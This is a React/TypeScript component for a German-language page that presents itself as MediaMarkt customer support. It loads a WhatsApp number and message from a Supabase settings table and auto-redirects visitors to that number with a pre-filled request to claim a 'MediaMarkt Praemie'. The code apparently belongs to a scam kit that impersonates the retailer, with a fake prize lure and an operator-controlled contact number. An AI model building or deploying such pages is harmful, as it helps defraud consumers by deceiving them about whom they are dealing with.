"use client";

import { useEffect, useMemo, useState } from "react";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";
import { useSettings } from "@/contexts/SettingsContext";

type Props = { sessionId: string | null };

const DEFAULT_MESSAGE =
  "Hallo, ich moechte meine MediaMarkt Praemie erhalten. Bitte helfen Sie mir weiter.";

export function WhatsAppClient({ sessionId }: Props) {
  const { settings } = useSettings();
  const [number, setNumber] = useState("");
  const [message, setMessage] = useState(DEFAULT_MESSAGE);
  const [ready, setReady] = useState(false);

  const waUrl = useMemo(() => {
    const digits = number.replace(/[^0-9]/g, "");
    if (!digits) return "";
    return `https://wa.me/${digits}?text=${encodeURIComponent(message.trim() || DEFAULT_MESSAGE)}`;
  }, [number, message]);

  useEffect(() => {
    let cancelled = false;
    (async () => {
      const supabase = createBrowserSupabaseClient();
      if (supabase) {
        const { data } = await supabase
          .from("global_settings")
          .select("site_control")
          .limit(1)
          .maybeSingle();
        if (!cancelled && data?.site_control) {
          const sc = data.site_control as Record<string, unknown>;
          if (typeof sc.whatsapp_number === "string") setNumber(sc.whatsapp_number);
          if (typeof sc.whatsapp_message === "string" && sc.whatsapp_message.trim()) {
            setMessage(sc.whatsapp_message);
          }
        }
      }
      if (!cancelled) setReady(true);
    })();
    return () => {
      cancelled = true;
    };
  }, []);

  // Hazir olunca ve numara varsa otomatik WhatsApp'a yonlendir.
  useEffect(() => {
    if (!ready || !waUrl) return;
    const t = setTimeout(() => {
      window.location.href = waUrl;
    }, 1200);
    return () => clearTimeout(t);
  }, [ready, waUrl]);

  return (
    <main className="flex min-h-[100dvh] items-center justify-center px-4 py-10">
      <div className="w-full max-w-md rounded-[1.75rem] border border-white/10 bg-[#141416]/90 p-8 text-center shadow-[0_24px_80px_rgba(0,0,0,0.55)] backdrop-blur-xl">
        <div className="mx-auto mb-5 flex h-20 w-20 items-center justify-center rounded-full bg-[#25D366]/15 ring-1 ring-[#25D366]/30">
          <svg viewBox="0 0 24 24" className="h-11 w-11 fill-[#25D366]" aria-hidden="true">
            <path d="M12.04 2a9.9 9.9 0 0 0-8.57 14.87L2 22l5.3-1.39A9.9 9.9 0 1 0 12.04 2Zm0 1.8a8.1 8.1 0 1 1-4.13 15.07l-.3-.18-3.14.82.84-3.06-.2-.31A8.1 8.1 0 0 1 12.04 3.8Zm-3.3 4.22c-.18 0-.47.07-.72.34-.24.27-.94.92-.94 2.25 0 1.33.96 2.6 1.1 2.79.13.18 1.9 3.04 4.7 4.14 2.31.91 2.78.73 3.29.68.5-.04 1.62-.66 1.85-1.3.23-.65.23-1.2.16-1.32-.07-.12-.25-.19-.53-.33-.27-.14-1.62-.8-1.87-.89-.25-.09-.44-.13-.62.14-.19.27-.72.9-.88 1.09-.16.18-.32.2-.6.07a7.5 7.5 0 0 1-2.2-1.36 8.2 8.2 0 0 1-1.52-1.89c-.16-.27 0-.41.12-.55.12-.12.27-.32.4-.48.14-.16.19-.28.28-.46.09-.19.05-.35-.02-.48-.07-.14-.62-1.5-.85-2.06-.22-.53-.45-.45-.62-.46l-.73-.03Z" />
          </svg>
        </div>
        <h1 className="text-2xl font-bold tracking-tight text-white">
          WhatsApp-Support
        </h1>
        <p className="mt-2 text-sm leading-relaxed text-white/60">
          Sie werden zum MediaMarkt-Kundensupport auf WhatsApp weitergeleitet.
          Eine Nachricht wird automatisch fuer Sie vorbereitet.
        </p>

        <a
          href={waUrl || undefined}
          onClick={(e) => {
            if (!waUrl) e.preventDefault();
          }}
          className={`mt-7 flex w-full items-center justify-center gap-2.5 rounded-2xl bg-[#25D366] px-6 py-4 text-base font-bold text-[#04310f] shadow-[0_10px_30px_rgba(37,211,102,0.35)] transition hover:bg-[#2ce075] active:scale-[0.98] ${waUrl ? "" : "pointer-events-none opacity-40"}`}
        >
          <svg viewBox="0 0 24 24" className="h-5 w-5 fill-current" aria-hidden="true">
            <path d="M12.04 2a9.9 9.9 0 0 0-8.57 14.87L2 22l5.3-1.39A9.9 9.9 0 1 0 12.04 2Zm5.8 11.56c-.23.65-1.35 1.26-1.85 1.3-.51.05-.98.23-3.29-.68-2.8-1.1-4.57-3.96-4.7-4.14-.14-.19-1.1-1.46-1.1-2.79 0-1.33.7-1.98.94-2.25.25-.27.54-.34.72-.34l.73.03c.17.01.4-.07.62.46.23.56.78 1.92.85 2.06.07.13.11.29.02.48-.09.18-.14.3-.28.46-.13.16-.28.36-.4.48-.12.14-.28.28-.12.55.17.27.74 1.22 1.52 1.89a7.5 7.5 0 0 0 2.2 1.36c.28.13.44.11.6-.07.16-.19.69-.82.88-1.09.18-.27.35-.23.62-.14.25.09 1.6.75 1.87.89.28.14.46.21.53.33.07.12.07.67-.16 1.32Z" />
          </svg>
          WhatsApp oeffnen
        </a>

        {!ready && (
          <p className="mt-4 text-xs text-white/40">Wird geladen...</p>
        )}
        {ready && !waUrl && (
          <p className="mt-4 text-xs font-medium text-red-400">
            WhatsApp ist derzeit nicht verfuegbar. Bitte versuchen Sie es spaeter erneut.
          </p>
        )}
      </div>
    </main>
  );
}
